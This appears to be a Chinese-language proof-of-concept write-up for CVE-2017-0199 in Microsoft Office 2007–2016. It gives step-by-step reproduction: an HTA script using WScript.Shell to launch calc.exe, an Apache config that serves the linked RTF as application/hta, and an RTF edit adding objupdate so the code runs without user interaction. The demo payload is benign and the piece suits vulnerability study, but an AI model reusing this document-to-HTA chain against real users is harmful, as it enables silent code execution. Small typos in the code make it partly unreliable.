### 漏洞简介

在无需用户交互的情况下，打开word文档就可以通过hta脚本执行任意代码。经过研究发现，此漏洞的成因主要是word在处理内嵌OLE2LINK对象时，通过网络更新对象时没有正确处理的Content-Type所导致的一个逻辑漏洞。

### 影响版本

Microsoft Office 2016

Microsoft Office 2013

Microsoft Office 2010

Microsoft Office 2007

### 漏洞复现

首先，创建一个正常的word文档，作为将要链接的rtf对象，命名为test.docx。

然后，将test.docx重命名为test.rtf后放到Apache服务器上面，并创建另一个文档，选择插入->对象->由文件创建，输入rtf文件路径后选择链接到文件。然后将该文件另存为rtf文件，名字为exp.rtf
![](https://github.com/cckuailong/PocCollect/blob/master/System/Win/CVE-2017-0199/img/1.png)

这时，我们在服务器端修改test.rtf文件为Visual Script Script代码需要注意反斜杠的转义，这段代码将弹出本地计算器。
```
<script>
a=new ActiveXObject("WScript.Shell");
a.run('%windir\\System32\\cmd.exe /c calc.exe',0);window.close();
</script>%
```

需要改一下Apache的配置，该代码会将该目录下的文件识别为hta脚本，然后重启服务器。
```
<Directory /var/www/html/test/>
    Header set Content-Type "application/hta"
</Dirctory>
```

点击“是”即可弹出计算器，此时用010Editor打开该文档，将\object\objautlink\rsltpict替换为\object\objautlink\objupdate\rsltpict，虽然仍然会有提示，但不需与用户交互，计算器便会自行弹出。

### 漏洞修复

安装最新补丁
